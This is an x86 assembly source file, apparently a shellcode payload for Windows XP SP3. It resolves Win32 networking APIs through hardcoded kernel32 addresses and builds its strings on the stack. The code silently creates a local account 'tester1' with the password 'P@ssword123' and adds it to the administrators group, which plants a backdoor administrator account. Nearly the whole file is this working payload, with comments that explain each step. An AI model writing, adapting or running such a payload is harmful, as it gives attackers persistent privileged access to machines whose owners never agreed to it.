; Purpose: 
;  Use Win32 API to create a new user and add to local administrators group 


global _start			

section .text

_start:

; Create Stack frame
PUSH EBP
MOV EBP,ESP
SUB ESP,0x30

; Zero out Stack Frame
MOV EAX,EBP
MOV ECX,0x30
L1:
  MOV BYTE [EAX],0x0
  DEC EAX
LOOP L1

; LoadLibrary(netapi32)
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
PUSH ECX			; null terminator
PUSH 0x32336970			; netapi32 in reverse 
PUSH 0x6174656E			 
PUSH ESP			; push pointer to netapi32
MOV EBX, 0x7c801d7b 		; WinXP SP3 (kernel32.dll, LoadLibrary)
CALL EBX			; call LoadLibrary
MOV DWORD [EBP-0x4],EAX		; save reference to netapi32

; GetProcAddress(netapi32, NetUserAdd)
push 0x00006464			; null terminated NetUserAdd in reverse 
push 0x41726573
push 0x5574654e
push esp			; push pointer to NetUserAdd
push DWORD [EBP-0x4]		; Address of netapi32
mov ebx, 0x7c80ae30		; WinXP SP3 (kernel32.dll, GetProcAddress)
call ebx			; Call GetProcAddress
mov [ebp-0x8], eax		; save address of NetUserAdd

; GetProceAddress(netapi32,NetLocalGroupAddMembers)
push 0x00737265			; null terminated NetLocalGroupAddMembers in reverse
push 0x626d654d
push 0x64644170
push 0x756f7247
push 0x6c61636f
push 0x4c74654e
push esp			; push pointer to NetLocalGroupAddMembers
push DWORD [EBP-0x4]		; Address of netapi32
mov ebx, 0x7c80ae30		; WinXP SP3 (kernel32.dll, GetProcAddress)
call ebx			; Call GetProcAddress
mov [ebp-0xC], eax		; Save address of NetLocalGroupAddMembers

; pointer to username - UNICODE tester1
push 0x00000031
push 0x00720065
push 0x00740073
push 0x00650074
MOV DWORD [EBP-0x10],ESP

; pointer to password - UNICODE P@ssword123
push 0x00000033
push 0x00320031
push 0x00640072
push 0x006f0077
push 0x00730073
push 0x00400050
MOV DWORD [EBP-0x14],ESP

; pointer to groupname - UNICODE administrators
xor ebx, ebx
push ebx
push 0x00730072
push 0x006f0074
push 0x00610072
push 0x00740073
push 0x0069006e
push 0x0069006d
push 0x00640061
MOV DWORD [EBP-0x1C],ESP

; setup USER_INFO struct
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1
; https://www.pinvoke.net/default.aspx/netapi32/USER_INFO_1.html
XOR EBX,EBX                              
PUSH EBX			; usri1_script_path = Null
INC EBX
PUSH EBX			; usri1_flags = UF_SCRIPT
DEC EBX
PUSH EBX			; usri1_comment = Null
PUSH EBX			; usri1_home_dir = Null
INC EBX
PUSH EBX			; usri1_priv = USER_PRIV_USER
DEC EBX
PUSH EBX			; usri1_password_age = Null
PUSH DWORD [EBP-0x14]		; pointer to password
PUSH DWORD [EBP-0x10]		; pointer to username
MOV DWORD [EBP-0x18],ESP	; save pointer to USER_INFO struct

; Call NetUserAdd
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
; https://www.pinvoke.net/default.aspx/netapi32.netuseradd
PUSH EBX			; parm_err = Null
PUSH DWORD [EBP-0x18]		; pointer to USER_INFO struct
INC EBX				
PUSH EBX			; level
DEC EBX
PUSH EBX			; servername = Null
MOV EBX,[EBP-0x08]		; NetUserAdd
CALL EBX			; Call NetUserAdd

; setup LOCALGROUP_MEMBERS_INFO_3 struct
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-localgroup_members_info_3
; https://www.pinvoke.net/default.aspx/Structures.LOCALGROUP_MEMBERS_INFO_3
push dword [EBP-0x10]			; push pointer to username
mov dword [EBP-0x20], esp		; pointer for LOCALGROUP_MEMBERS_INFO_3.lgrmi3_domainandname

; Call to NetLocalGroupAddMembers
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
; https://www.pinvoke.net/default.aspx/netapi32.netlocalgroupaddmembers
xor eax, eax			; clear eax
xor ebx, ebx			; clear ebx
inc ebx	
push ebx			; totalentries = 1
dec ebx
push dword [EBP-0x20]		; buf = pointer to LOCALGROUP_MEMBERS_INFO_3 struct
push 0x3			; level
push dword [EBP-0x1C]		; groupname = pointer to administrators
push ebx			; servername = Null
mov ebx, [EBP-0xC]		; NetLocalGroupAddMembers
call ebx			; Call NetLocalGroupAddMembers
